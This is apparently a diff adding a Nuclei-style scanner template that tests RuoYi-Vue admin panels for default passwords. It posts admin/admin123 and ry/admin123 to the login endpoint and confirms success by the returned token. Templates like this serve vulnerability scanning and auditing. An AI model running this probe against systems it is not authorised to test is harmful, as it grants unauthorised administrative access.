@@ -1,0 +1,42 @@
+id: ruoyi-vue-default-login
+
+info:
+  name: RuoYi-Vue 弱口令漏洞
+  author: bl
+  severity: high
+  description: |
+    若依系统存在默认口令admin/admin123
+  classification:
+    cwe-id: CWE-287
+  tags: 若依-管理系统
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        
+        {"username":"{{username}}","password":"{{password}}","code":"","uuid":""}
+    
+    stop-at-first-match: true
+    payloads:
+      username:
+        - admin
+        - ry
+      password:
+        - admin123
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"msg":"操作成功'
+          - '"code":200'
+          - '"token":"'
+        condition: and
